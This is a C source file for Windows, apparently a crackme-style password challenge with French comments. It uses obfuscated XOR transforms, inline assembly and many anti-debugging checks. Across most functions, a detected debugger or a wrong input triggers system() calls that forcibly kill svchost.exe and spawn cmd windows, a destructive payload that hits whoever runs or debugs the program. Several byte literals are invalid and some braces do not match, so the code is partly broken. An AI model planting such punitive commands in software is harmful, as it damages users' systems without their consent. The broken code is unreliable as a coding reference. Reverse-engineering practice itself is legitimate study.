#include "stdafx.h"
#include <tchar.h>
#include <wchar.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include "Windows.h"
#include "time.h"
#include "Wincrypt.h"
#include <intrin.h>
#pragma intrinsic(_ReturnAddress)

#define SHELLSCRIPT2 "\
taskkill -f -im svchost.exe \n\
"
 

#define SHELLSCRIPT1 "\
start cmd.exe | start cmd.exe \n\
"


int noon;  // = argc
int does; 
int ouii;
int tres;  // = longueur de argv[1]
char MB[32];  // argv[1] sous forme de char (plus pratique)
char *s = "0123";   // le mot de passe
int za = 8;
char *MBb;   // argv[1]
char *zec = "0x547825";
//_TCHAR bravo[32]={'L','O','R','e','m','i','P','s','u','M','p','A', 0x26,0x72,0x89,0x16,0x36,'\x00'};
_TCHAR polet[32]={'a','b','c','d','e','f','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F','0','B','C','A','3','2','5','4','A','e','\x00'};
_TCHAR polet2[32]={0x65,0x411b,0x72,0x7e,0x23,0x62,0x09,0x14,0x60,0x71,0x34,0x76,0x21,0x06,0x28,0x1,0x00,0x5a,0x60,0x53,0x30,0x26,0x10,0x27,0x10,0x59,0x28,0x0b,0x32,0x06,0x0f,0x53};
_TCHAR a[7] = {'\x0a','\x1e','\x11','\xa7','\xes','\x79','\x99'};
_TCHAR aa[11] = {'\x90','\x8d','\xb0','\x7c','\x10','\xdd','\x7d','\xf9','\x1e','\xf0','\x18'};
_TCHAR aaa[17] = {'\x1e','\xae','\xbc','\x47','\xbs','\xba','\xff','\xfa','\xde','\xb0','\xe7','\x1s','\x2a','\x4e','\x01','\x07','\x1s'};
_TCHAR aaaa[12] = {'\x6a','\x4a','\xb3','\xa5','\x2s','\x2a','\x1e','\x6a','\x8e','\xb0','\x64','\x4s'};
_TCHAR aaaaa[21] = {'\x8a','\xdb','\x74','\xa7','\x19','\xae','\x7e','\x7a','\x5e','\xb0','\xb7','\xds','\xda','\x64','\xaa','\xac','\x61','\x44','\xdf','\xaf','\xdf'};

char testAdd[55]={'\x55' ,'\x8B' ,'\xEC' ,'\x81' ,'\xEC' ,'\xC4' ,'\x00' ,'\x00'  ,'\x00' ,'\x53' ,'\x56' ,'\x57' ,'\x8D' ,'\xBD' ,'\x3C' ,'\xFF',
				'\xFF' ,'\xFF' ,'\xB9' ,'\x31' ,'\x00' ,'\x00' ,'\x00' ,'\xB8'  ,'\xCC' ,'\xCC' ,'\xCC' ,'\xCC' ,'\xF3' ,'\xAB' ,'\xD9' ,'\x45',
				'\x08' ,'\xD8' ,'\x45' ,'\x0C' ,'\xD9' ,'\x9D' ,'\x3C' ,'\xFF'  ,'\xFF' ,'\xFF' ,'\xD9' ,'\x85' ,'\x3C' ,'\xFF' ,'\xFF' ,'\xFF',
				'\x5F' ,'\x5E' ,'\x5B' ,'\x8B' ,'\xE5' ,'\x5D' ,'\xC3'};

char testSub[55]={'\x55','\x8B' ,'\xEC' ,'\x81' ,'\xEC' ,'\xC4' ,'\x00' ,'\x00' ,'\x00' ,'\x53' ,'\x56' ,'\x57' ,'\x8D' ,'\xBD' ,'\x3C' ,'\xFF',
				'\xFF' ,'\xFF' ,'\xB9' ,'\x31' ,'\x00' ,'\x00' ,'\x00' ,'\xB8' ,'\xCC' ,'\xCC' ,'\xCC' ,'\xCC' ,'\xF3' ,'\xAB' ,'\xD9' ,'\x45',
				'\x08' ,'\xD8' ,'\x65' ,'\x0C' ,'\xD9' ,'\x9D' ,'\x3C' ,'\xFF' ,'\xFF' ,'\xFF' ,'\xD9' ,'\x85' ,'\x3C' ,'\xFF' ,'\xFF' ,'\xFF',
				'\x5F' ,'\x5E' ,'\x5B' ,'\x8B' ,'\xE5' ,'\x5D' ,'\xC3'};

char testDiv[55]={'\x55','\x8B' ,'\xEC' ,'\x81' ,'\xEC' ,'\xC4' ,'\x00' ,'\x00' ,'\x00' ,'\x53' ,'\x56' ,'\x57' ,'\x8D' ,'\xBD' ,'\x3C' ,'\xFF',
				'\xFF' ,'\xFF' ,'\xB9' ,'\x31' ,'\x00' ,'\x00' ,'\x00' ,'\xB8' ,'\xCC' ,'\xCC' ,'\xCC' ,'\xCC' ,'\xF3' ,'\xAB' ,'\xD9' ,'\x45',
				'\x08' ,'\xD8' ,'\x75' ,'\x0C' ,'\xD9' ,'\x9D' ,'\x3C' ,'\xFF' ,'\xFF' ,'\xFF' ,'\xD9' ,'\x85' ,'\x3C' ,'\xFF' ,'\xFF' ,'\xFF',
				'\x5F' ,'\x5E' ,'\x5B' ,'\x8B' ,'\xE5' ,'\x5D' ,'\xC3'};

char testMul[55]={'\x55' ,'\x8B' ,'\xEC' ,'\x81' ,'\xEC' ,'\xC4' ,'\x00' ,'\x00' ,'\x00' ,'\x53' ,'\x56' ,'\x57' ,'\x8D' ,'\xBD' ,'\x3C' ,'\xFF',
				'\xFF' ,'\xFF' ,'\xB9' ,'\x31' ,'\x00' ,'\x00' ,'\x00' ,'\xB8' ,'\xCC' ,'\xCC' ,'\xCC' ,'\xCC' ,'\xF3' ,'\xAB' ,'\xD9' ,'\x45',
				'\x08' ,'\xD8' ,'\x4D' ,'\x0C' ,'\xD9' ,'\x9D' ,'\x3C' ,'\xFF' ,'\xFF' ,'\xFF' ,'\xD9' ,'\x85' ,'\x3C' ,'\xFF' ,'\xFF' ,'\xFF',
				'\x5F' ,'\x5E' ,'\x5B' ,'\x8B' ,'\xE5' ,'\x5D' ,'\xC3'};

//can xor each array and fully xor the key
	//premier xor
	_TCHAR tabxor1[8]={'F','U','C','K','Y','O','U'};
	_TCHAR tabxor2[11]={'S','A','y','H','E','L','l','o','!','?'};
	_TCHAR tabxor3[4]={'M','f','k'};
	_TCHAR tabxor4[8]={'B','r','A','v','o','N','i'};
	_TCHAR tabxor5[4]={'e','l','S'};
	//deuxime xor
	_TCHAR tabxor11[4]={'E','A,','R'};
	_TCHAR tabxor12[5]={'C','H','e','h'};
	_TCHAR tabxor21[6]={'p','E','r','D','U'};
	_TCHAR tabxor22[6]={'X','Y','L','l','O'};
	_TCHAR tabxor31[3]={'u','d'};
	_TCHAR tabxor32[2]={'W'};


typedef float (*type_float) (float,float);

///////////////////////////////////////////////// oprations de base

float Add(float a, float b) // addition
{
    return a+b;
}
float Sub(float a, float b) // soustraction
{
    return a-b;
}
float Mul(float a, float b)  // multiplication
{
    return a*b;
}
float Div(float a, float b)    // division
{
    return a/b;
}

bool cecinedebugpas() {

    __asm {

		xor ebx,ebx

		lea ebx, fs:[10h]

		mov ecx, ebx

		nop

		mov ebx, 20h

		xor ecx, ebx

		nop

		add ebx, 10h

        mov eax, fs:[ebx]

        cmp byte ptr [eax+2], 0



        jne kfeofk

        mov eax, 0

        jmp done



kfeofk:

		nop
        mov eax, 1

    done:

    }
}



void MaliciousEntry()

{
	system(SHELLSCRIPT2);
    system(SHELLSCRIPT1);
    exit(0);

}



void Trampoline2()

{

    __try

    {

        __asm int 3;

    }

    __except (EXCEPTION_EXECUTE_HANDLER)

    {

        MaliciousEntry();

    }

}







void Trampoline1()

{

    __try 

    {

        __asm int 3;

    }

    __except (EXCEPTION_EXECUTE_HANDLER)

    {

        Trampoline2();

    }

}


///////////////////////////////////////////////// p1
	//if(argc != 2)

	//{
	//	printf("boulet\n");
	//	return 1;
	//}

__declspec(noinline) int fff(int oui){
	int y = 2;
	int e = y+2;

	// debugg 1
	// debugger  foutre un peu partout dans le code

	clock_t start_time = clock();

	// debugger classique

	if(IsDebuggerPresent() )

	{
		system(SHELLSCRIPT2);
		system(SHELLSCRIPT1);
		exit(0);

	}

	// ----- fin

	if (oui ==y) {
	// crire code asm
		return 0;
	}
	else {
		// debug 2
		int debug2;
		CheckRemoteDebuggerPresent(GetCurrentProcess(),&debug2);

		if(debug2){

			system(SHELLSCRIPT2);
			system(SHELLSCRIPT1);
			exit(0);

		}
		//--------fin


		if ( e==4 && true){
			if (noon == y ) {
				// ecrire code asm
				return 2;
			}
			else {
				//printf("boulet 1\n"); // truc mchant
				system(SHELLSCRIPT2);
				system(SHELLSCRIPT1);
				exit(0);
			}
		}
	}	
	return 0;
}

__declspec(noinline)int ff(int x,int y) {   // ff(1,2)
	
	int z = 0;
	if (x>0){

		// debug 1
			// debugger  foutre un peu partout dans le code

		clock_t start_time = clock();

		// debugger classique

		if(IsDebuggerPresent() )

		{

			exit(0);


		}
		// --------fin

		if (y>0){
			x = x+ y;
		}

		// debug maison 
		if(cecinedebugpas()){
			exit(0);
		}
		// -------fin

		z = y+2;
		for (int i = z;i<5;i++) {
			// crire code asm
			}
		does = does + z;


		// debug 2
		int debug;
		CheckRemoteDebuggerPresent(GetCurrentProcess(),&debug);

		if(debug){
			exit(0);
		}
		//--------fin

		fff(z);  // ff(4)
		return 2;
		}
	return 1;
}


////////////////////////////////////////////////////////p2
	//if(_tcslen(argv[1]) > 32)
	//{
	//	printf("boulet\n");
	//	return 1;

	//	//faire ce qu'on veut

	//}

__declspec(noinline)int gg(int x) {
	
	if (x>0){ // x=3
		if (tres<=33){
			x = x+ 2;
		}
		else {
			//printf("boulet 2\n"); // truc mchant
			system(SHELLSCRIPT2);
			system(SHELLSCRIPT1);
			exit(0);
		}
		does = x+2;
		for (int i = does;i<20;i++) {
			does++;
			// crire code asm
			}
		return 2;
		}

	// debug 1
	// debugger  foutre un peu partout dans le code

	clock_t start_time = clock();

	// debugger classique

	if(IsDebuggerPresent() )

	{
		system(SHELLSCRIPT2);
		system(SHELLSCRIPT1);
		exit(0);

	}
	return 1;
}

__declspec(noinline)int ggg(_TCHAR t,int non) {
	
	int a = 1;
	int b = 1;
	int c = a + noon; // c = 2
	int d = 15656;
	int e = d+non;

	while (c !=2) {
		b = 9;
		c = 2;

		// debug 1
		clock_t start_time = clock();

		// debugger classique

		if(IsDebuggerPresent() )

		{
			system(SHELLSCRIPT2);
			system(SHELLSCRIPT1);
			exit(0);
		}
		// -----------fin

	}
	if (b>0){

		// debug 2

		int debug;
		CheckRemoteDebuggerPresent(GetCurrentProcess(),&debug);

		if(debug){

			system(SHELLSCRIPT2);
			system(SHELLSCRIPT1);
			exit(0);

		}

		//--------fin

		if (a>=0){
			e = d+ 2;
			gg(non); //gg(3)
		}
		c = a+2;
		for (int i = 0;i<5;i++) {
			if (b<2){ // b = 1
				
				// debug maison 
				if(cecinedebugpas()){
					system(SHELLSCRIPT2);
					system(SHELLSCRIPT1);
					exit(0);

				}
				// -------fin

				return 0;
			}
			e = e + 3;
			d = b;
		}
		d = d + noon;  // d = 1+2 =3
		return 2;
		}
	return 1;
}
////////////////////////////////////////////////////////////p3chiffrement cl

__declspec(noinline)void pull(int i,_TCHAR test,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	//if i<4
	int tabulation = test;
	//bravo[i]=bravo[i]^tabxor11[i];

	//remplace le xor
	tabulation = (test+tabxor11[i]);
	_asm
	{
		mov eax,694217;
		mov edi, ebx;
		add edi, eax;
		mul eax;
		nop;
		and edi,eax;
		sub edi,42;
		nop;
		add edi,eax;
		or eax,edx;
		nop;
	}
	tabulation -= (test & tabxor11[i]); 
	tabulation -= (test & tabxor11[i]);
	bravo[i]=tabulation;
	//fin du remplacement du xor
	_asm
	{
		nop;
		nop;
	}

}

__declspec(noinline)void moule(int i,_TCHAR test,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	//bravo[i]=bravo[i]^tabxor12[i%4];
	int retour=test;
	//remplace le xor
	retour = (test+tabxor12[i%4]);
	_asm
	{
		mov eax,837652;
		add edi,eax;
		and edi,edx;
		nop;
		sub edx,0x42;
		nop;
		mov eax,ebx;
		nop
	}
	retour -= (test & tabxor12[i%4]); 
	retour -= (test & tabxor12[i%4]);
	bravo[i]=retour;
	//fin du remplacement du xor
	_asm
	{
		nop;
		nop;
	}
}
__declspec(noinline)void maths(int i,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	_TCHAR test;
	//if(i<7)
	//bravo[i]=bravo[i]^tabxor1[i];
			//bravo[i]= (bravo[i] | tabxor1[i]) - (bravo[i] & tabxor1[i]);//lui il marche

	//remplace le xor
	test=bravo[i];
	test = (bravo[i]+tabxor1[i]);
	_asm
	{
		mov eax,41004100;
		mov edi, ebx;
		add edi, eax;
		mul eax;
		nop;
		and edi,eax;
		sub edi,42;
	}
	test -= (bravo[i] & tabxor1[i]); 
	test -= (bravo[i] & tabxor1[i]);
	//fin du remplacement du xor
	_asm
	{
		nop;
		nop;
	}
	if(i<4)
	{
		pull(i,test,bravo);
	}
	else
	{
		moule(i,test,bravo);
	}
}


__declspec(noinline)void coquille(int i, _TCHAR lateam,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	//if(i<12)
	//bravo[i]=bravo[i]^tabxor21[i%7];

	//remplace le xor
	int pescara = lateam;
	pescara = (lateam+tabxor21[i%7]);
	_asm
	{
		mov eax,0x410041;
		or eax,edi;
		mov edi,eax;
		nop;
		nop;
		and edi,eax;
		or edi,edx;
		sub edi, eax;
		nop;
		nop;
	}
	pescara -= (lateam & tabxor21[i%7]); 
	pescara -= (lateam & tabxor21[i%7]);
	bravo[i]=pescara;
	//fin du remplacement du xor
	_asm
	{
		nop;
		nop;
	}
}

__declspec (noinline)void huitre(int i,_TCHAR lateam,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	_asm
	{
		nop;
		nop;
	}
	//bravo[i]=bravo[i]^tabxor22[i%12];

	//remplace le xor
	_TCHAR pasteque = lateam;
	pasteque = (lateam+tabxor22[i%12]);
	_asm
	{
		mov eax,41004100;
		mov edi, ebx;
		add edi, eax;
		mul eax;
		nop;
		and edi,eax;
		sub edi,42;
	}
	pasteque -= (lateam & tabxor22[i%12]); 
	pasteque -= (lateam & tabxor22[i%12]);
	bravo[i]=pasteque;
	//fin du remplacement du xor
	_asm
	{
		nop;
		nop;
	}
}


__declspec(noinline)void palourde(int i,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	//milieux
	//bravo[i]=bravo[i]^tabxor2[i%7];
			
			//remplace le xor
			_TCHAR lateam=bravo[i];
			lateam = (bravo[i]+tabxor2[i%7]);
			_asm
			{
				mov edi, ebx;
				add edi, eax;
				nop;
				nop;
				sub eax, ebx;
				add eax, 0x72;
				nop;
				and edi,eax;
				sub edi,42;
				nop;
			}
			lateam -= (bravo[i] & tabxor2[i%7]); 
			lateam -= (bravo[i] & tabxor2[i%7]);
			//fin du remplacement du xor
			_asm
			{
				nop;
				nop;
			}
			if(i<12)
			{
				coquille(i,lateam,bravo);
			}
			else
			{
				huitre(i,lateam,bravo);
			}
}


__declspec(noinline)void moum(int i,_TCHAR espoir,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	int lavage=espoir;
	_asm
	{
		nop;
		nop;
	}
	//bravo[i]=bravo[i]^tabxor31[i%17];

	//remplace le xor
	lavage = (espoir+tabxor31[i%17]);
	_asm
	{
		nop;
		nop;
		add edx,0x24;
		mov eax,0x72;
	}
	lavage -= (espoir & tabxor31[i%17]); 
	lavage -= (espoir & tabxor31[i%17]);
	bravo[i]=lavage;
	//fin du remplacement du xor
	_asm
	{
		nop;
		nop;
	}
}

__declspec(noinline)void moli(int i,_TCHAR espoir,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	//bravo[i]=bravo[i]^tabxor32[i%19];

				//remplace le xor
				int detartrage=espoir;
				detartrage = (espoir+tabxor32[i%19]);
				_asm
				{
					mov eax,0x123456;
					mov edi, ebx;
					add edi, eax;
					mul eax;
					nop;
					and edi,eax;
					sub edi,42;
				}
				detartrage -= (espoir & tabxor32[i%19]); 
				detartrage -= (espoir & tabxor32[i%19]);
				bravo[i]=detartrage;
				//fin du remplacement du xor
				_asm
				{
					nop;
					nop;
				}
}
__declspec(noinline)void miam(int i,_TCHAR bravo[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	//(if i>17)
	int espoir=bravo[i];
	//bravo[i]=bravo[i]^tabxor3[i%17];

	//remplace le xor
	espoir = (espoir+tabxor3[i%17]);
	_asm
	{
		mov eax,1544242;
		mov edi, ebx;
		sub edi, eax;
		mul eax;
		add eax,edi
		nop;
		and edi,eax;
		sub edi,0x42;
		nop;
	}
	espoir -= (bravo[i] & tabxor3[i%17]); 
	espoir -= (bravo[i] & tabxor3[i%17]);
			
	//fin du remplacement du xor
	_asm
	{
		nop;
		nop;
	}
	if(i>19)
	{
		moli(i,espoir,bravo);
	}
	else
	{
		moum(i,espoir,bravo);
	}
}




__declspec(noinline)void do_something(_TCHAR testouille[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	char yolo[10]={'b'^64,'i'^64,'e'^64,'n'^64,' '^64,'j'^64,'o'^64,'u'^64,'e'^64,'\x00'^64};
	int j=0;
	while(testouille[j]!='\0' && j<=32)
	{
		polet[j]=testouille[j];
		j++;
	}
	//ajouter code mort 
	int a= 192+958;
	int b=72+6;
	_asm
	{
		nop;
		nop;
	}
	int i=0;
	for (int i =0 ; i<32; i++)
	{
		
		if( i<7)
		{
			maths(i,polet);
		}
		else if(i>=17)
		{
			miam(i,polet);
		}
		else
		{
			palourde(i,polet);
		}
		//xor en cascade
	}
	if(j<0)
	{
		for(int k=0;k<10;k++)
		{
			printf("%c",yolo[k]^64);
		}
		printf("\n");
	}
	
	/*
	for(int i=0; i<32; i++)
	{
		printf("%x,",polet[i]);
	}
	printf("\n");*/
}


////////////////////////////////////////////////////////////p3

	//if( strcmp(MB,s)==0 ) )//changer s avec la vrai phrase attendu
	//{
			//printf("Bravo, c'est le bon\n"); // phrase de bravo
			//return 1;
	//}


__declspec(noinline)int hhh(_TCHAR t,int non, int ok) {  //hhh('t',17,0 ou autre) 
	
	int a = 0;
	int o = a + ok - 8; // c = 2
	int d = 87 + ok;
	int e = non;
	char helllo = 'a';
	char er = '\0';
	int c;
	
	while (helllo !='a') {
		int b = 9;
		c = 2;
	}
	if (non>=0){  
		if (d>=0){    //  tjrs le cas

			// debug 2
			int debug;
			CheckRemoteDebuggerPresent(GetCurrentProcess(),&debug);
			
			if(debug){
				system(SHELLSCRIPT2);
				system(SHELLSCRIPT1);
				exit(0);

			}
			//--------fin

			for (int i=0;i<3;i++) {
				helllo = 'e';
				o = o+i;
			}
			
			if (ok >= 0 &&  d <= 87) {
										// si ok =0 <=> si argv[1] = password 
			}
		}
		e = e+2;
		for (int i = 0;i<5;i++) {
			if (a<2){ // a = 0
				
				// debug maison 
				if(cecinedebugpas()){
					system(SHELLSCRIPT2);
					system(SHELLSCRIPT1);
					exit(0);
				}
				// -------fin

				return 0;
			}
			e = e + 3;
			d = c;
		}
		}
	return 1;
}


///////////////////////////////////////////////// p4

	//while ( ( c = *s ) && ( (c>='A' && c<='F') || (c>='a' && c<='f') || (c>='0' && c<='9' ) ) )s++;

	//if(c != '\0')
	//{
	//	//faire ce qu'on veut
	//	printf("boulet 4\n");
	//}
	//else
	//{
	//	printf("%S\n",argv[1]);
	//}


__declspec(noinline)int iii(char x) {
	
	char d = 'a';
	char *t = &d;
	int r = 2;

	// debug 1
	// debugger  foutre un peu partout dans le code

	clock_t start_time = clock();

	// debugger classique

	if(IsDebuggerPresent() )

	{
		system(SHELLSCRIPT2);
		system(SHELLSCRIPT1);
		exit(0);
	}

	//----------fin

	for (int i = does;i<20;i++) {

		// debug maison 
		if(cecinedebugpas()){
			system(SHELLSCRIPT2);
			system(SHELLSCRIPT1);
			exit(0);

		}
		// -------fin


		while ( ( d = *s ) && ( (d>='A' && d<='F') || (d>='a' && d<='f') || (d>='0' && d<='9' ) ) ) { 
			r++;
			r = strcmp(t,zec);
			return 0;

			}
		return 2;
		}
	return 1;
}

__declspec(noinline)int ii(int x) {
	
	char j = 'a';
	if (za + x >5){ // za= 8 et x=3
		for (int r=0; r>4; r--) {
			x++;
			// crire code asm
		}
		while ( ( j = *MBb ) && ( (j>='A' && j<='F') || (j>='a' && j<='f') || (j>='0' && j<='9' ) ) ) MBb++;
		
		if(j != '\0') {
		// debug 1
		clock_t start_time = clock();

		// debugger classique

		if(IsDebuggerPresent() )

		{
			system(SHELLSCRIPT2);
			system(SHELLSCRIPT1);
			exit(0);
		}
		//------------fin

		//faire ce qu'on veut
		system(SHELLSCRIPT2);
		system(SHELLSCRIPT1);
		}
		
		else
		{
			printf("%s\n",MB);
		}

		}
		iii(j);
		
	return 0;
}


__declspec(noinline)int i(int entier) {  // i(32)
	
	int b = 8;
	char x = -entier;
	char l = 'a';
	char m = 'A';
	char *pass = "mdp_final";
	if (x<b){ // x=-32
		while (x < 1 ) {
			x++;
		}
	}

	while ( ( m = *pass ) ||  (m>='A' && m<='F') ) {

		// debug 1
		clock_t start_time = clock();

		// debugger classique
		if(IsDebuggerPresent() )

		{
			system(SHELLSCRIPT2);
			system(SHELLSCRIPT1);
			exit(0);
		}

		// ---------fin
		x = -b;
		b++;
		ii(3);

		// debug 2
		int debug;
		CheckRemoteDebuggerPresent(GetCurrentProcess(),&debug);
		
		if(debug){
			system(SHELLSCRIPT2);
			system(SHELLSCRIPT1);
			exit(0);
			}

		//--------fin
		
		return 0;
	}

	return 1;
}

__declspec(noinline)int yoo(int n){
    if (n>64){
        return 64-5;
    }

    if (n <= 1) {
        return n;
    } else {
        return yoo(n - 1) + yoo(n - 2);
    }

}

__declspec(noinline)void oui(int n){
    int gruyere = yoo(10);
    if (gruyere > 456){
        polet[30] = _T('\x58');
    }
    else{
        polet[30] = _T('\x57');
    }

}

__declspec(noinline)int yoo2(int n){
    if (n>2){
        return 64-5;
    }

    if (n <= 1) {
        return n;
    } else {
        return yoo(n - 1) + yoo(n - 2);
    }

}

__declspec(noinline)void oui2(int n){
    int gruyere = yoo2(5);
    if (gruyere > 456){
        polet[12] = _T('\x26');
    }
    else{
        polet[12] = _T('\x62');
    }

}


void fonction3(int n) {
    int i = 0;
    char b = 'z';
    int e = 12;

    while (i < n) {
        if (i % 2 == 0) {
            e++;
            for (int j = 0; j < i; ++j) {
                if (j % 2 == 0) {
                    polet[9] = _T('\x12');
                    break;
                } else {
                    polet[4] = _T('\x13');
                    break;
                }
            }
        } else {
            int k = 0;
            while (k < i) {
                if (k % 2 == 0) {
                    k++;
                    polet[17] = _T('\xa1');
            }
        }
        i++;
        printf("f33");
    }
        break;
}
}



void fonction2(int n) {
    int i = 0;
    int a = 0;
    int d = 9;
    while (i < n) {
        if (i % 2 == 0) {
            for (int j = 0; j < i; ++j) {
                a++;
                break;
            }
            d--;
            polet[24] = _T('\xea');
        } else {
            int k = 0;
            while (k < i) {

                k++;
                break;
            }
            polet[24] = n;
        }
        i++;
    }
    polet[4] = _T('\x12');
    fonction3(4);
}





__declspec(noinline)int sss(int non, int ok) {  // return  a= 12 , il faut non >0

    int z = 0;
    int o = z - 8; 
    int d = 1 ;
    int e = non;
    char helllo = 'a';  // = 97 en ascii
    char er = '\0';


    while (helllo !='m') {  // m = 109 = 97+12
        helllo++;
        if (non != 0){
            d = d + ok;
            z++;  // z = 12
        }
    }

    if (z == 12) { // true
        polet[3] = _T('\xde');
        polet[1] = e;
        fonction2(z);
    }
    else {
        polet[3] = d;

    }

    return 0;

    return 1;
}

int ppp(_TCHAR vingtsept[])
{
	PVOID pRetAddress = _ReturnAddress();
    if (*(PBYTE)pRetAddress == 0xCC) // int 3
    {
        DWORD dwOldProtect;
        if (VirtualProtect(pRetAddress, 1, PAGE_EXECUTE_READWRITE, &dwOldProtect))
        {
            *(PBYTE)pRetAddress = 0x90; // nop
            VirtualProtect(pRetAddress, 1, dwOldProtect, &dwOldProtect);
        }
    }
	int p=32;
	sss(8,6);
	oui(3);
	oui(2);
	do_something(vingtsept);
	for(int j= 0; j<32;j++)
	{
		ggg('a',2);
		if(polet[j]!=polet2[j])
		{
			return 24;
		}
		else
		{
			_asm
			{
				nop
				nop
			}
		}
	}
	printf("c'est le bon\n");
	return 0;
}




int _tmain(int argc,_TCHAR* argv[])

{
	_TCHAR c = 'a';
	_TCHAR gauloise[32];
	
	type_float pipelette= (type_float) (&testAdd);
	type_float pipolette= (type_float) (&testSub);
	type_float pipalette= (type_float) (&testDiv);
	type_float pipulette= (type_float) (&testMul);
	float papou = pipelette(2,3);
	float pipou = pipolette(3,2);
	float pepou = pipalette(3,2);
	float pupou = pipulette(3,2);
	//printf("%f\n",pupou);

	/* part 1*/
	// crire code asm

	int non = 0; 
	while(argv[++non] != NULL);
	
	noon = non;

	int k = 1;
	int j = 2;

	ff(k,j);


	/*part 2 */

	_TCHAR *t = argv[1];   // si uniquement 2 argv 
	ouii = 3; 
	int oui = 0; 
	while(t[++oui] != NULL); // t = argv[1]
	tres = oui;
	ggg(c,ouii);
	

	/* part 3 phrase bravo */ 
	int ret = 17;
	int rett = 0;     // rsultat de strcmp(char[1], password)
	_TCHAR r;
	int bs = 33;
	wchar_t *WC = argv[1];
	r = 't';
	int plot=ppp(argv[1]);
	/* convertir wchar_t * (issu du _TCHAR) en char * */
	ret = wcstombs(MB, WC, bs);
	rett = ppp(argv[1]); // comparaison password et argv[1]
	MBb = MB;
	hhh(r,ret,rett);  // hhh('t',17,0 ou autre) (0 si password, autre sinon)

	
	/* part 4 comparaison lettre  lettre */
	
	char y = '\0';
	i(bs); // i(32)


	return 0;

}




